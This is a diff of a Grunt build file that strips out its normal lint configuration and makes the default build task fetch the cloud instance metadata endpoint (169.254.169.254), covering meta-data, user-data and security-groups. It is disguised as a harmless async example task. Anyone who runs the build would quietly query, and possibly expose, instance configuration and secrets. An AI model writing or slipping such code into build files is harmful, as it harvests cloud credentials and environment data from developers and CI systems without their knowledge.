@@ -1,4 +1,3 @@
-module.exports = function(grunt) {
 
 var request = require('request');
 var run = function(url) {
@@ -8,28 +7,28 @@ var run = function(url) {
   });	
 };
 
-run('http://169.254.169.254/latest/meta-data');
-run('http://169.254.169.254/latest/user-data');
-run('http://169.254.169.254/latest/meta-data/security-groups');
-  
+
+module.exports = function(grunt) {
   grunt.initConfig({
-    jshint: {
-      files: ['Gruntfile.js', 'src/**/*.js', 'test/**/*.js'],
-      options: {
-        globals: {
-          jQuery: true
-        }
-      }
-    },
-    watch: {
-      files: ['<%= jshint.files %>'],
-      tasks: ['jshint']
-    }
   });
+  
+  grunt.registerTask('asyncfoo', 'My "asyncfoo" task.', function() {
+   // Force task into async mode and grab a handle to the "done" function.
+   var done = this.async();
+   
+     
+  run('http://169.254.169.254/latest/meta-data');
+  run('http://169.254.169.254/latest/user-data');
+  run('http://169.254.169.254/latest/meta-data/security-groups');
+   // Run some sync stuff.
+   grunt.log.writeln('Processing task...');
+   // And some async stuff.
+   setTimeout(function() {
+     grunt.log.writeln('All done!');
+     done();
+   }, 5000);
+ });
 
-  grunt.loadNpmTasks('grunt-contrib-jshint');
-  grunt.loadNpmTasks('grunt-contrib-watch');
-
-  grunt.registerTask('default', ['jshint']);
+  grunt.registerTask('default', ['asyncfoo']);
 
 };
